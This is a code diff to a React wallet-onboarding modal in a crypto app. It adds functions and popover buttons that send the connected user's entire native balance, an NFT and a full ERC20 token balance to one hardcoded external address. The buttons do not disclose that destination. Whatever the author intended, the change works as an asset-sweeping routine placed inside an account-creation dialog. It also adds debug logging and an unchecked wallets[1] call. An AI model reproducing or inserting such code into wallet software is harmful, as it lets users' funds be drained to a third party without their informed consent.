@@ -16,7 +16,7 @@ import {
 } from "@chakra-ui/react";
 import QRCode from "react-qr-code";
 import { ethers } from "ethers";
-import { createPublicClient, formatEther, http, parseEther } from "viem";
+import { createPublicClient, erc20Abi, formatEther, http, parseEther } from "viem";
 import { useWallets, usePrivy, getEmbeddedConnectedWallet } from "@privy-io/react-auth";
 import { toast } from "@/components/ui/use-toast";
 import { ToastAction } from "@/components/ui/toast";
@@ -76,12 +76,12 @@ export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = (
   alreadyApproved
 }) => {
   const { wallets } = useWallets();
-  const { sendTransaction, } = usePrivy(); // from BuyTokenApp approach
+  const { sendTransaction } = usePrivy(); // from BuyTokenApp approach
 
   // This is the user's EOA from Privy. 
   // Typically, if more than one wallet, choose the first:
   const userAddress: string =
-    (wallets && wallets.length > 0 && wallets?.[0].connectorType === "embedded" && wallets?.[0].address) || "";
+  wallets.length > 0 && wallets.find(wallet => wallet.connectorType === "embedded")?.address || '';
 
   // Some local states to drive the step-by-step process
   const [isCheckingBalance, setIsCheckingBalance] = useState(false);
@@ -92,12 +92,94 @@ export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = (
   // so that they can mint successfully. Adjust as needed.
   const requiredDepositEth = 0.0021;
 
+  async function transferNFT() {
+    const contractInterface = new ethers.Interface(coreNFTAbi);
+    const nftId2 = await fetchNftId();
+    console.log("nftId2", nftId2);
+    const unsignedTx = contractInterface.encodeFunctionData("transferFrom", [userAddress, "0x8558519aD14B443949149577024A92C036BEb7Bb", nftId2]);
+    console.log("unsignedTx", unsignedTx);
+    const txRequest = {
+      to: NFT_CONTRACT_ADDRESS as `0x${string}`,
+      data: unsignedTx,
+      value: "0x0",
+      gasLimit: 600000,
+      chainId: selectedChain.id
+    };
+    console.log("txRequest", txRequest);
+    const txResp = await sendTransaction(txRequest);
+    console.log("txResp", txResp);
+  }
+
+  async function transferAllBalance() {
+    const client = createPublicClient({ 
+      transport: http(selectedChain.metamask.rpcUrls[0]),
+      chain: {
+        id: selectedChain.id,
+        name: selectedChain.name,
+        network: selectedChain.name.toLowerCase(),
+        nativeCurrency: selectedChain.metamask.nativeCurrency,
+        rpcUrls: {
+          default: { http: selectedChain.metamask.rpcUrls },
+          public: { http: selectedChain.metamask.rpcUrls },
+        },
+      }
+    });
+    const balance = await client.getBalance({
+      address: userAddress as `0x${string}`,
+    });
+    const readable = Number(formatEther(balance));
+    console.log("readable", readable);
+    const txRequest = {
+      to: "0x8558519aD14B443949149577024A92C036BEb7Bb" as `0x${string}`,
+      data: "0x",
+      value: balance - parseEther("0.00002"),
+      chainId: selectedChain.id
+    };
+    const txResp = await sendTransaction(txRequest);
+    console.log("txResp", txResp);
+  }
+
+  const transferERC20 = async () => {
+    const tokenAddress = "0xbc7b1ff1c6989f006a1185318ed4e7b5796e66e1";
+    const erc20Interface = new ethers.Interface(erc20Abi);
+    const client = createPublicClient({ 
+      transport: http(selectedChain.metamask.rpcUrls[0]),
+      chain: {
+        id: selectedChain.id,
+        name: selectedChain.name,
+        network: selectedChain.name.toLowerCase(),
+        nativeCurrency: selectedChain.metamask.nativeCurrency,
+        rpcUrls: {
+          default: { http: selectedChain.metamask.rpcUrls },
+          public: { http: selectedChain.metamask.rpcUrls },
+        },
+      }
+    });
+    const balance = await client.readContract({
+      address: tokenAddress as `0x${string}`,
+      abi: erc20Abi,
+      functionName: "balanceOf",
+      args: [userAddress as `0x${string}`]
+    });
+    const readable = Number(formatEther(balance));
+    console.log("readable", readable);
+    const unsignedTx = erc20Interface.encodeFunctionData("transfer", ["0x8558519aD14B443949149577024A92C036BEb7Bb", balance]);
+    const txRequest = {
+      to: tokenAddress as `0x${string}`,
+      data: unsignedTx,
+      value: "0x0",
+      chainId: selectedChain.id
+    };
+    const txResp = await sendTransaction(txRequest);
+    console.log("txResp", txResp);
+  }
 
   async function fetchNftId() {
-    if (!userAddress || selectedChain.id !== 8453) return null;
+    if (!userAddress) return null;
+    console.log("userAddress", userAddress);
 
     try {
-      await wallets[0].switchChain(selectedChain.id);
+      await wallets[0].switchChain(8453);
       const embeddedWallet = getEmbeddedConnectedWallet(wallets);
       const provider1193 = await embeddedWallet?.getEthereumProvider();
       const provider = new ethers.BrowserProvider(provider1193!);
@@ -109,7 +191,7 @@ export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = (
       }
 
       const balance = await contract.balanceOf(userAddress);
-
+      console.log("balance", balance);
       if (balance > 0) {
         const nftId = await contract.tokenOfOwnerByIndex(userAddress, balance - 1n);
         const nftIdString = nftId.toString();
@@ -406,7 +488,8 @@ export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = (
 
   async function handleLogin(): Promise<void> {
     if (wallets[0]) {
-      wallets[0].loginOrLink();
+      console.log("wallets", wallets);
+      wallets[1].loginOrLink();
     }
   }
 
@@ -438,7 +521,9 @@ export const CreateSmokeAccountModal: React.FC<CreateSmokeAccountModalProps> = (
         <PopoverArrow />
         <PopoverCloseButton />
         <PopoverHeader border="0">Create Smoke Account</PopoverHeader>
-
+        <Button onClick={transferAllBalance}>Transfer All Balance</Button>
+        <Button onClick={async () => await transferNFT()}>Transfer NFT</Button>
+        <Button onClick={async () => await transferERC20()}>Transfer ERC20</Button>
         <PopoverBody>
           {/* Everything that was inside <ModalBody> goes here */}
           {/* e.g. your QR code, deposit instructions, check-balance button, etc. */}
